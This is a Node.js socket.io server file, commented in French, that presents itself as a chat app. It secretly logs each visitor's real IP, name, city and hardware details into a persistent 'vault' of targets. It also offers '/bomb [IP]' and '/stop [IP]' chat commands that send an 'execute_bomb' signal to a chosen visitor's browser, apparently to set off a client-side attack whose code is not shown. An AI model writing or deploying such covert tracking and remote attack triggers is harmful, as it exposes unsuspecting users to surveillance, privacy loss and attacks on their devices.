const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

app.use(express.static(__dirname));

const vault = {}; // Base de données des cibles

io.on('connection', (socket) => {
    // Extraction de la véritable IP (même derrière Cloudflare)
    const ip = (socket.handshake.headers['x-forwarded-for'] || 
                socket.handshake.address || 
                socket.conn.remoteAddress).split(',')[0].trim();

    socket.on('check_device', (info) => {
        // Enregistrement complet dans le dossier cible
        vault[ip] = { 
            sid: socket.id, 
            name: info.name,
            hw: info.hardware,
            geo: info.geo
        };
        
        console.log(`
        ╔═════════════ DOSSIER EXTRAIT ═════════════╗
        ║ NOM    : ${info.name}
        ║ IP     : ${ip}
        ║ VILLE  : ${info.geo.city}
        ║ MATOS  : ${info.hardware.gpu}
        ║ RAM/CPU: ${info.hardware.ram}GB / ${info.hardware.cores} cores
        ║ BATTERIE: ${info.hardware.battery}%
        ╚═══════════════════════════════════════════╝
        `);

        // Reconnexion automatique si l'IP est connue
        socket.emit('session_restored', vault[ip]);
    });

    socket.on('chat message', (data) => {
        const msg = data.text.trim();

        // COMMANDE BOMB : /bomb [IP]
        if (msg.startsWith("/bomb ")) {
            const targetIP = msg.split(" ")[1];
            let hit = false;
            Object.keys(vault).forEach(storedIP => {
                if (storedIP.includes(targetIP)) {
                    io.to(vault[storedIP].sid).emit('execute_bomb');
                    hit = true;
                }
            });
            if(hit) console.log(`[!!!] BOMB_DEPLOYED_ON: ${targetIP}`);
        } 
        // COMMANDE STOP : /stop [IP]
        else if (msg.startsWith("/stop ")) {
            const targetIP = msg.split(" ")[1];
            Object.keys(vault).forEach(storedIP => {
                if (storedIP.includes(targetIP)) {
                    io.to(vault[storedIP].sid).emit('stop_bomb');
                }
            });
        } 
        else {
            io.emit('chat message', data);
        }
    });

    socket.on('disconnect', () => {
        // On conserve les données dans la vault pour le ciblage IP permanent
    });
});

http.listen(3000, () => { console.log("GALAXY_OS_ULTIMATE_UP"); });
